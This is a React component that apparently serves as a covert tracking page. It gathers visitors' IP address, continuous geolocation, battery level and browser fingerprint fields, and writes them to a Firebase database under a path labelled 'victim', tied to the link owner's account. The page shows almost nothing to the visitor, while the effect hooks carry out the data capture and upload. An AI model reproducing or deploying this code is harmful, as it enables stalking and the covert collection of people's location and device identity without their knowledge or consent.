import { ref, set } from "firebase/database"
import { useEffect, useState } from "react"
import { useNavigate, useParams } from "react-router-dom"
import { auth, database } from "../../../DATABASE/Config"
import useRoutProtect from "../../../CUSTOMHOOK/useRoutProtect"


const DeviceInfo = () => {
  const {uid} = useParams();
  const [location, setLocation] = useState({
    latitude: null,
    longitude: null,
  });
  const [ip, setIp] = useState('')
  const loginNavigate = useNavigate()

  useRoutProtect(auth, uid, loginNavigate)
  
  const [battery, setBattery] = useState('')
  // Check if the Battery Status API is supported
if ('getBattery' in navigator) {
  navigator.getBattery().then(function(battery) {
    // Update the battery status initially
    updateBatteryStatus(battery);

    // Listen for changes in the battery status
    battery.addEventListener('chargingchange', function() {
      updateBatteryStatus(battery);
    });

    battery.addEventListener('levelchange', function() {
      updateBatteryStatus(battery);
    });
  });
} else {
  console.log('Battery Status API not supported');
}

// Function to update the battery status
function updateBatteryStatus(battery) {
  setBattery('Battery Level: ' + (battery.level * 100) );
}

  useEffect(() => {
    fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => setIp(data.ip))
    .catch(error => console.log(error))
  },[])

  useEffect(() => {
    navigator.geolocation.watchPosition((position) => {
      setLocation((prevInfo) => ({
        ...prevInfo,
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
      }));
    });
  }, []);
  useEffect(() => {
  
    const path = `${window.screen.colorDepth}${window.navigator.deviceMemory}${window.screen.height}${window.screen.width}`

    set(ref(database, `user/${uid}/victim/device/${path}`),{
      userAgent: navigator.userAgent,
          platform: navigator.platform,
          appName: navigator.appName,
          appVersion: navigator.appVersion,
          language: navigator.language,
          screenWidth: window.screen.width,
          screenHeight: window.screen.height,
          colorDepth: window.screen.colorDepth,
          pixelRatio: window.devicePixelRatio,
          isOnline: navigator.onLine,
          cookiesEnabled: navigator.cookieEnabled,
          doNotTrack: navigator.doNotTrack,
          hardwareConcurrency: navigator.hardwareConcurrency,
          batteryLevel: battery + '%',
          deviceMemory: window.navigator.deviceMemory,
          geolocation: navigator.geolocation,
          latitude: location.latitude,
          longitude: location.longitude,
          ip
    })
  },[uid,location, battery,ip])
  return (
    <div>DeviceInfo{Math.floor(location.latitude * location.longitude)}
        battery {navigator.getBattery}
    </div>
  )
}

export default DeviceInfo